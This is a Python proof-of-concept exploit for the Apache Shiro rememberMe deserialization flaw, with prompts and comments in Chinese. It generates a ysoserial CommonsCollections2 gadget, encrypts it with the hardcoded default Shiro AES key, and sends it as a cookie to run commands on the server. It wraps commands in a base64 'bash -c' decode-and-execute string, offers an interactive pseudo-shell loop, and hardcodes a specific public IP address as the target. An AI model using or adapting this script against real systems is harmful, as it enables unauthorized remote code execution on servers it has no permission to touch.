import sys
import uuid
import base64,os
import subprocess,requests,time
from Crypto.Cipher import AES

def poc(url, target):
    try:
        payload = generator(target)
        requests.get(url, cookies={'rememberMe': payload.decode()}, timeout=10, verify=False)
        time.sleep(0.5)
        print("[+] Command execution completed")
    except Exception as e:
        print("异常对象的内容是%s"%e)


def generator(command):
    
    command = "java -jar ysoserial.jar CommonsCollections2 \"{}\"".format(command)
    popen = subprocess.Popen(command, stdout=subprocess.PIPE ,shell=True,close_fds=True)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    out,drr = popen.communicate()
    file_body = pad(out)
    #print(os.getcwd())
    print(command)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


print("[*]在额外方框内添加执行的命令!")
def check(url, target=None):
    if target:
        target = base64.b64encode(target.encode()).decode()
        #当命令出现管道符号或者空格时，容易造成歧义，需要进行base64编码
        target = 'bash -c {echo,'+target+'}|{base64,-d}|{bash,-i}'
    poc(url, target)

def command(url):
    while(1):
        command = input("fuhei@shell$ ")
        if command == 'exit' or command  == 'quit':
            break
        else:
            payload = generator(command)
            requests.get(url, cookies={'rememberMe': payload.decode()}, timeout=10, verify=False)
            time.sleep(0.5)

if __name__ == '__main__':
    #payload = 'touch /home/3.txt'
    check("http://47.100.137.231:8080/login.jsp;jsessionid=A3438112CFE7F15B65C3738BF16C0F88")
    #print("rememberMe={0}".format(payload.decode()))    
